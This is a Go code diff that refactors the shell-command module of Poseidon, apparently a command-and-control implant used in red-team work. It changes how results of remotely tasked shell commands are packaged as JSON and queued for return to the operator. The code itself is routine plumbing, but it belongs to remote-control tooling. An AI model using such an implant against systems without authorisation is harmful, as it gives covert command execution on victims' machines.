@@ -1,8 +1,14 @@
 package shell
 
 import (
+	"encoding/json"
+	"sync"
+
+	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
+
+var mu sync.Mutex
 
 //Shell - Interface for running shell commands
 type Shell interface {
@@ -11,19 +17,28 @@ type Shell interface {
 }
 
 //Run - Function that executes the shell command
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 	res, err := shellExec(task.Params)
 
-	tMsg.TaskItem = task
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error() + "\n" + string(res.Response())
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
-	tMsg.TaskResult = res.Response()
-	tMsg.Error = false
-	threadChannel <- tMsg
+	msg.UserOutput = string(res.Response())
+	msg.Completed = true
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
